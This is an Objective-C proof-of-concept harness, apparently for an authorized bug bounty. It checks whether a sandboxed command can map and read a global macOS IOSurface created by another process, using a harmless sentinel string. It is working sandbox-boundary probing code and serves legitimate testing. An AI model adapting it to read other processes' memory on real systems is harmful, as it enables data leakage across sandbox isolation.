// Boundary-verification harness for sandbox-runtime (authorized bug-bounty PoC).
//
// Question under test: the macOS Seatbelt profile srt generates grants
// (allow iokit-open (iokit-registry-entry-class "IOSurfaceRootUserClient")
//                    (iokit-user-client-class  "IOSurfaceSendRight")).
// A "global" IOSurface is a kernel-backed object any process can map by its
// small integer ID via IOSurfaceLookup(). Does a sandboxed srt command inherit
// that reach, i.e. can it map a global surface created by another host process?
//
// Two modes, kept deliberately small:
//   host  <sentinel> <seconds> <idfile>  create ONE global BGRA surface, fill it
//                                         with the sentinel, write its ID, hold.
//   read  <id> <sentinel>                look that ID up, report whether the
//                                         sentinel bytes are visible. PASS/FAIL.
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurface.h>
#include <string.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

static IOSurfaceRef make_global(int w, int h) {
  NSDictionary *d = @{
    (id)kIOSurfaceWidth           : @(w),
    (id)kIOSurfaceHeight          : @(h),
    (id)kIOSurfaceBytesPerElement : @4,
    (id)kIOSurfacePixelFormat     : @((uint32_t)'BGRA'),
    (id)kIOSurfaceIsGlobal        : @YES,   // same flag Firefox/Gecko set
  };
  return IOSurfaceCreate((__bridge CFDictionaryRef)d);
}

int main(int argc, const char **argv) {
  if (argc >= 2 && strcmp(argv[1], "host") == 0 && argc == 5) {
    @autoreleasepool {
      const char *sentinel = argv[2];
      int seconds = atoi(argv[3]);
      IOSurfaceRef s = make_global(512, 64);
      if (!s) { fprintf(stderr, "create failed\n"); return 1; }
      IOSurfaceLock(s, 0, NULL);
      uint8_t *b = IOSurfaceGetBaseAddress(s);
      size_t n = IOSurfaceGetAllocSize(s), L = strlen(sentinel);
      for (size_t off = 0; off + L <= n; off += L) memcpy(b + off, sentinel, L);
      IOSurfaceUnlock(s, 0, NULL);
      FILE *f = fopen(argv[4], "w");
      fprintf(f, "%u\n", IOSurfaceGetID(s));
      fclose(f);
      printf("HOST global IOSurface id=%u, holding %ds\n", IOSurfaceGetID(s), seconds);
      fflush(stdout);
      sleep(seconds);
      CFRelease(s);
    }
    return 0;
  }
  if (argc == 4 && strcmp(argv[1], "read") == 0) {
    @autoreleasepool {
      IOSurfaceID id = (IOSurfaceID)strtoul(argv[2], NULL, 10);
      const char *sentinel = argv[3];
      IOSurfaceRef s = IOSurfaceLookup(id);
      if (!s) { printf("READ id=%u lookup=NULL -> NOT REACHABLE\n", id); return 2; }
      IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL);
      const char *b = IOSurfaceGetBaseAddress(s);
      size_t n = IOSurfaceGetAllocSize(s);
      int found = (memmem(b, n, sentinel, strlen(sentinel)) != NULL);
      char head[33]; memcpy(head, b, 32); head[32] = 0;
      for (int i = 0; i < 32; i++) if (head[i] < 32 || head[i] > 126) head[i] = '.';
      IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
      printf("READ id=%u mapped size=%zu first32=\"%s\" sentinel=%s\n",
             id, n, head, found ? "FOUND" : "absent");
      printf("%s\n", found ? "RESULT: READABLE across the sandbox boundary"
                           : "RESULT: mapped but sentinel not present");
      return found ? 0 : 3;
    }
  }
  fprintf(stderr, "usage: %s host <sentinel> <seconds> <idfile> | read <id> <sentinel>\n", argv[0]);
  return 64;
}
